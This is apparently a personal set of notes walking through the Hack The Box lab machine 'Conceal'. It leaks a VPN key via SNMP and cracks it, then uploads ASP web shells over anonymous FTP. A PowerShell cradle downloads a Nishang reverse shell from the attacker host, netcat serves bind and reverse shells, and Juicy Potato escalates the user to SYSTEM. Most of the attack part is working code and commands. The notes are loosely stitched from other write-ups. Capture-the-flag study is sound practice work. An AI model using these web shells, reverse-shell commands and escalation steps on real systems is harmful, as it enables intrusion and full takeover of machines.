# conceal

- OS Name:                   Microsoft Windows 10 Enterprise
- OS Version:                10.0.15063 N/A Build 15063
- No hotfix

- UDP scan
- Snmp wlak -> give credential for IPSec
- Setup IPSec
- Upload webshell.jsp & nc.exe thanks anonymous ftp
- Account get SeImpersonatePrivilege => 


# Walkthrough

- https://hackso.me/conceal-htb-walkthrough/
- https://0xdf.gitlab.io/2019/05/18/htb-conceal.html


# Nmap


No TCP port open

## Nmap UDP

````
# nmap -sU -p 160-165 10.10.10.116
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-14 01:54 EDT
Nmap scan report for 10.10.10.116
Host is up (0.096s latency).

PORT    STATE         SERVICE
160/udp open|filtered sgmp-traps
161/udp open|filtered snmp
162/udp open|filtered snmptrap
163/udp open|filtered cmip-man
164/udp open|filtered smip-agent
165/udp open|filtered xns-courier

Nmap done: 1 IP address (1 host up) scanned in 2.36 seconds
````


## Nmap UDP Top 20

I’ll run nmap on the top 20 ports with standard scripts enabled. The scripts are more likely to get a responses from an open port. It works:
````
root@kali# nmap -sU -sC --top-ports 20 -oA nmap/udp-top20-scripts 10.10.10.116
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-14 01:46 EDT
Nmap scan report for 10.10.10.116
Host is up (0.11s latency).      
                                             
PORT      STATE         SERVICE  
53/udp    open|filtered domain       
67/udp    open|filtered dhcps           
68/udp    open|filtered dhcpc                                                                                                                 
69/udp    open|filtered tftp     
123/udp   open|filtered ntp          
135/udp   open|filtered msrpc                 
137/udp   open|filtered netbios-ns                             
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open          snmp                     
| snmp-interfaces:                                             
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel(R) 82574L Gigabit Network Connection\x00
|     IP address: 10.10.10.116  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b2:68:88 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 1.69 Mb sent, 2.53 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b2:68:88 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 1.69 Mb sent, 2.54 Mb received
|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00
|     MAC address: 00:50:56:b2:68:88 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 1.69 Mb sent, 2.54 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b2:68:88 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 1.69 Mb sent, 2.54 Mb received
| snmp-netstat:
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  10.10.10.116:139     0.0.0.0:0
|   TCP  10.10.10.116:49676   10.10.14.15:443
|   TCP  10.10.10.116:49682   10.10.14.15:443
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  0.0.0.0:51681        *:*
|   UDP  0.0.0.0:54275        *:*
|   UDP  0.0.0.0:59047        *:*
|   UDP  0.0.0.0:65166        *:*
|   UDP  10.10.10.116:137     *:*
|   UDP  10.10.10.116:138     *:*
|   UDP  10.10.10.116:1900    *:*
|   UDP  10.10.10.116:54399   *:*
|   UDP  127.0.0.1:1900       *:*
|_  UDP  127.0.0.1:54400      *:*
| snmp-processes:               
|   1:                                           
|     Name: System Idle Process                                
|   4:
|     Name: System  
...[snip]...
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open          isakmp
| ike-version: 
|   vendor_id: Microsoft Windows 8
|   attributes: 
|     MS NT5 ISAKMPOAKLEY
|     RFC 3947 NAT-T
|     draft-ietf-ipsec-nat-t-ike-02\n
|     IKE FRAGMENTATION
|     MS-Negotiation Discovery Capable
|_    IKE CGA version 1
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
Service Info: OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 62.12 seconds
````


=> SNMP
=> SNMP Netstat : lot of TCP port open


# SNMP - UDP 161


````
root@kali# snmpwalk -v 2c -c public 10.10.10.116
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 63 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (83409) 0:13:54.09
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
iso.3.6.1.2.1.2.1.0 = INTEGER: 15
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2
...[snip]...
````

I could look up iso.3.6.1.2.1.1.4 (https://www.alvestrand.no/objectid/1.3.6.1.2.1.1.4.html) and see that it is sysContact, but it’s easier if I just enable MIB support for snmpwalk (for details, see the Mischief post: https://0xdf.gitlab.io/2019/01/05/htb-mischief.html#background), and run that again:

### Snmpwalk setup

If I run snmpwalk as installed on Kali without further setup, it just prints out the OIDs, which aren’t too meaningful. By installing the mibs package, it will turn the numbers into strings that have meaning. First, install the mibs-downloader:

root@kali:~/hackthebox/mischief-10.10.10.92# apt install snmp-mibs-downloader

Then go into /etc/snmp/snmp.conf and comment out the only uncommented line to use the mibs.


## snmp walk

````
root@kali# snmpwalk -v 2c -c public 10.10.10.116
SNMPv2-MIB::sysDescr.0 = STRING: Hardware: Intel64 Family 6 Model 63 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.311.1.1.3.1.1
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (502332) 1:23:43.32
SNMPv2-MIB::sysContact.0 = STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
SNMPv2-MIB::sysName.0 = STRING: Conceal
SNMPv2-MIB::sysLocation.0 = STRING: 
SNMPv2-MIB::sysServices.0 = INTEGER: 76
IF-MIB::ifNumber.0 = INTEGER: 15
IF-MIB::ifIndex.1 = INTEGER: 1
IF-MIB::ifIndex.2 = INTEGER: 2
...[snip]...
````


## Crack 

https://crackstation.net/
Hash	Type	Result
9C8B1A372B1878851BE2C097031B6E43	NTLM	Dudecake1!

https://hashkiller.co.uk/Cracker/MD5


## snmp-check

````
 # snmp-check -v2c -c public 10.10.10.116
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.116:161 using SNMPv2c and community 'public'

[*] System information:

  Host IP address               : 10.10.10.116
  Hostname                      : Conceal
  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
  Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
  Location                      : -
  Uptime snmp                   : 00:01:20.64
  Uptime system                 : 00:00:56.07
  System date                   : 2019-3-7 02:41:00.0
  Domain                        : WORKGROUP

[*] User accounts:

  Guest               
  Destitute           
  Administrator       
  DefaultAccount      

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 128
  TCP segments received         : 2
````


  
#IPSec

## IKE version
````
# nmap -sU -p 500 --script ike-version 10.10.10.116
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-05 02:41 UTC
Nmap scan report for 10.10.10.116
Host is up (0.18s latency).

PORT    STATE SERVICE
500/udp open  isakmp
| ike-version:
|   vendor_id: Microsoft Windows 8
|   attributes:
|     MS NT5 ISAKMPOAKLEY
|     RFC 3947 NAT-T
|     draft-ietf-ipsec-nat-t-ike-02\n
|     IKE FRAGMENTATION
|     MS-Negotiation Discovery Capable
|_    IKE CGA version 1
Service Info: OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds
````
=> IKE v1


## Strongswan

https://www.strongswan.org/

````
$ cat /etc/ipsec.conf

config setup

conn %default
       inactivity=1h
       keyexchange=ikev1
       ike=3des-sha1-modp1024!
       esp=3des-sha1
       authby=secret

conn conceal
       left=%any
       right=10.10.10.116
       rightsubnet=10.10.10.116[tcp/%any]
       type=transport
       auto=add
````
````
cat /etc/ipsec.secrets

 : PSK "Dudecake1!"
````



````
$ ipsec start

$ipsec up conceal

# Nmap again
````
# nmap -n -v -Pn -sT -p21,80,139,445 10.10.10.116 -A --reason -oN nmap.txt
...
PORT    STATE SERVICE       REASON  VERSION
21/tcp  open  ftp           syn-ack Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
139/tcp open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack
...
Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-03-07 00:53:56
|_  start_date: 2019-03-06 23:06:41
````
- Anonymous FTP login allowed
- Microsoft IIS 10.0
- SMB

## dirb

````
root@kali# gobuster -u http://10.10.10.116 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,aspx,asp,html -o gobuster-txt_aspx_asp_html_23small.txt        

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.116/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,aspx,asp,html
[+] Timeout      : 10s
=====================================================
2019/01/14 08:39:29 Starting gobuster
=====================================================
/upload (Status: 301)
/Upload (Status: 301)
=====================================================
2019/01/14 09:47:03 Finished
=====================================================
````

## ASP shell

````
# cat /opt/shells/asp/cmd.asp 
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>


ftp put...

# curl http://10.10.10.116/upload/0xdf.asp?cmd=whoami


````


## ftp anomymous

put tst.txt

````
cat hello.asp

<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<html>
<body>
<form action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</form>
<pre>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
</pre>
<br>
<b>Command Output:</b>
<br>
<pre>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write Server.HTMLEncode(thisDir)%>
</pre>
<br>
</body>
</html>
````
## USe nc


Upload nc.exec

Call it

````
http://10.10.10.116/upload/hello.asp?cmd=c%3A%5Cinetpub%5Cwwwroot%5Cupload%5Cnc.exe+-lnvp+12345+-e+cmd.exe
````

## Use nishang

````
Nishang Invoke-PowerShellTcp.ps1.

    Make a copy of it in the local directory.
    Add a line to the end: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 443
    Start python3 -m http.server 80 in that same directory
    Start nc -lnvp 443
    Visit: http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.15/Invoke-PowerShellTcp.ps1%27)

First the webserver is hit to get Invoke-PowerShellTcp.ps1:

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.116 - - [14/Jan/2019 09:49:41] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

Then nc gets the callback:

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.116.
Ncat: Connection from 10.10.10.116:49675.
Windows PowerShell running as user CONCEAL$ on CONCEAL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\SysWOW64\inetsrv>whoami
conceal\destitute

````


## Escalation

````
whoami /priv
SeImpresonatePrivilege => Hot potato, or Juicy Potato
````
https://github.com/ohpe/juicy-potato/releases


https://ohpe.it/juicy-potato/CLSID/

I smell potato cooking! There were different types of potato uncovered in my reseach and oh boy, in the end the “juicy” one seems the most promising because of the various command switches available. More importantly, I can change to a different COM server other than BITS.

For some reason I couldn’t recall, I decided to go for UsoSvc’s CLSID, which can be found here(https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)
Earlier on, I’d already established that Conceal is a Windows 10 Enterprise.

The CLSID of UsoSvc is {B91D5831-B1BD-4608-8198-D72E155020F7}. We are now set to run the exploit.

Upload via powershell
````
> invoke-webrequest -uri http://10.10.14.15:81/juicypotato.exe -outfile jp.exe
````

Upload the exploit jp.exe to C:\inetpub\wwwroot\upload via FTP.
````
> bin
> put jp.exe
````


````
>systeminfo

Host Name:                 CONCEAL
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.15063 N/A Build 15063
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00329-00000-00003-AA343
Original Install Date:     12/10/2018, 20:04:27
System Boot Time:          13/05/2019, 06:42:20
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 05/04/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,256 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 2,306 MB
Virtual Memory: In Use:    893 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.116
                                 [02]: fe80::4ccb:aafa:2793:40a8
                                 [03]: dead:beef::ccbd:7ffa:69d9:283f
                                 [04]: dead:beef::a947:36cc:c1a8:7109
                                 [05]: dead:beef::4ccb:aafa:2793:40a8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

````


run the exploit.
````
>jp.exe -l 9999 -p C:\inetpub\wwwroot\upload\nc.exe -a "10.10.14.30 54321 -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
````
````
nc -lvp 54321

type proot.txt
````




````
I can go to the JuicyPotato GitHub https://github.com/ohpe/juicy-potato/tree/master/CLSID
and find a list of CLSIDs for Windows 10 Enterprise https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise
I’ll try a few that run as “NT AUTHORITY\SYSTEM” until I get one to work.

C:\users\Destitute\appdata\local\Temp>jp.exe -t * -p \users\Destitute\appdata\local\Temp\rev.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}                                                                
jp.exe -t * -p \users\Destitute\appdata\local\Temp\rev.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}                                                                                                      
Testing {5B3E6773-3A99-4A3D-8096-7765DD11785C} 9001
COM -> recv failed with error: 10038

C:\users\Destitute\appdata\local\Temp>jp.exe -t * -p \users\Destitute\appdata\local\Temp\rev.bat -l 9001 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}                                                                
jp.exe -t * -p \users\Destitute\appdata\local\Temp\rev.bat -l 9001 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}                                                                                                      
Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 9001
......
[+] authresult 0
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

When it does, I get a request on my python webserver:

10.10.10.116 - - [14/Jan/2019 19:13:46] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

And then a shell:

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.116.
Ncat: Connection from 10.10.10.116:49723.
Windows PowerShell running as user CONCEAL$ on CONCEAL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system

Now now I’ll grab the root flag:

````




## Other escaladation


### Watson


````
watson shows several potential vulns:

PS C:\users\Destitute\appdata\local\temp> .\a.exe
  __    __      _
 / / /\ \ \__ _| |_ ___  ___  _ __
 \ \/  \/ / _` | __/ __|/ _ \| '_ \
  \  /\  / (_| | |_\__ \ (_) | | | |
   \/  \/ \__,_|\__|___/\___/|_| |_|

                           v0.1

                  Sherlock sucks...
                   @_RastaMouse

 [*] OS Build number: 15063
 [*] CPU Address Width: 64
 [*] Process IntPtr Size: 8
 [*] Using Windows path: C:\WINDOWS\System32

  [*] Appears vulnerable to MS16-039
   [>] Description: An EoP exist when the Windows kernel-mode driver fails to properly handle objects in memory.
   [>] Exploit: https://www.exploit-db.com/exploits/44480/
   [>] Notes: Exploit is for Windows 7 x86.

  [*] Appears vulnerable to MS16-123
   [>] Description: The DFS Client driver and running by default insecurely creates and deletes drive letter symbolic links in the current user context, leading to EoP.
   [>] Exploit: https://www.exploit-db.com/exploits/40572/
   [>] Notes: Exploit requires weaponisation.

  [*] Appears vulnerable to CVE-2018-8897
   [>] Description: An EoP exists when the Windows kernel fails to properly handle objects in memory.
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/mov_ss.rb
   [>] Notes: May not work on all hypervisors.

  [*] Appears vulnerable to CVE-2018-0952
   [>] Description: An EoP exists when Diagnostics Hub Standard Collector allows file creation in arbitrary locations.
   [>] Exploit: https://www.exploit-db.com/exploits/45244/
   [>] Notes: None.

  [*] Appears vulnerable to CVE-2018-8440
   [>] Description: An EoP exists when Windows improperly handles calls to Advanced Local Procedure Call (ALPC).
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/alpc_taskscheduler.rb
   [>] Notes: None.

 [*] Finished. Found 5 vulns :)

 ````


